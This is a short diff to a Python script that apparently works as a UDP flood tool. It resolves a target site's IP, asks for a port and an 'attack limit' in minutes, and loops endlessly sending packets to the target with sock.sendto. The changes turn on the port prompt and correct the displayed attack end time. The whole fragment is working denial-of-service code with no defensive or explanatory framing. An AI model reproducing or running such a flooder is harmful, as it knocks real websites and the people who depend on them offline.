@@ -43,14 +43,16 @@ ip = socket.gethostbyname(site)
 print ('Site IP: ',ip)
 print()
 print('##########################################')
-#print
-#siteport = int(input('port: '))
 print()
+print
+port = int(input('port: '))
+print()
+print('TIME: %s:%s'%(hour,minute))
 print
 limit = int(input('attack limit(minute): '))
 stopminute = minute + limit
-print(stopminute)
-print('End site attack in: %s:%s'%(hour,minute))
+print('End site attack in: %s:%s'%(hour,stopminute))
+print('##########################################')
 
 while True:
      sock.sendto(bytes, (ip,port))
